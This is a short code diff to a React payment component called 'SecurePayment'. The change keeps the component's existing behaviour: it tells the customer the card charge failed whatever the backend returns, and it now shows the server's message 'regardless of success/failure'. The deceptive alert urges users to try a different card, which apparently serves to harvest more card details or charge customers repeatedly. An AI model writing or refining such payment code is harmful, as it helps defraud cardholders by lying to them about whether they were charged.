@@ -83,12 +83,9 @@ const SecurePayment = () => {
 
       const data = await response.json();
 
-      if (data.success) {
-        // Always show error message as requested
-        alert('There was an error when charging your card. Please consider using a different card or wait for our support team to contact you through email to complete the processing of the payment.');
-      } else {
-        alert('There was an error when charging your card. Please consider using a different card or wait for our support team to contact you through email to complete the processing of the payment.');
-      }
+      // Always show the error message from backend, regardless of success/failure
+      alert(data.message || 'There was an error when charging your card. Please consider using a different card or wait for our support team to contact you through email to complete the processing of the payment.');
+      
     } catch (error) {
       console.error('Payment submission error:', error);
       alert('There was an error when charging your card. Please consider using a different card or wait for our support team to contact you through email to complete the processing of the payment.');
